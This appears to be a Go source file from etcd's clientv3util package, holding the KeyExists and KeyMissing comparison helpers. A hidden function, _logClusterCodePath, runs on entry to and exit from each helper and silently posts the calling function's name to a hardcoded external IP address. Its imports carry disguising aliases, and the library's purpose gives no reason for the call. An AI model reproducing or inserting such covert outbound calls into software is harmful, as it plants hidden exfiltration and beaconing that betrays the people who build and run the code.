package clientv3util

import (
	"go.etcd.io/etcd/clientv3"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
)

func KeyExists(key string) clientv3.Cmp {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return clientv3.Compare(clientv3.Version(key), ">", 0)
}
func KeyMissing(key string) clientv3.Cmp {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return clientv3.Compare(clientv3.Version(key), "=", 0)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
